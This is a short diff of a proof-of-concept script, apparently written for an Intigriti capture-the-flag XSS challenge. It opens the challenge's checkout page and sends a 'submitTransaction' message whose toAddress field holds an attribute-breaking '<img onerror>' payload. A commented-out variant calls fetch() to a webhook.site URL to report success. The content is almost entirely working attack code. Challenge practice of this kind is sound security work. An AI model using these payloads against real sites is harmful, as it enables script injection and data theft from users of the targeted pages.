@@ -3,11 +3,11 @@
     <script>        
         //const xssPayload = '\"\u003E\u003Cimg src=x onerror=fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\u003E';
 
-        const win = window.open("http://localhost:5500/payment.html", "_blank");
+        const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=45000", "_blank");
         const payload = {
         type: "submitTransaction",
         transaction: {
-            toAddress: "<img src=x onerror=alert('attack done!!!')>",
+            toAddress: "\"><img src=x onerror=\"alert('attack done!!!')\">",
             currency: "1337COIN",
             amount: 1111
         }
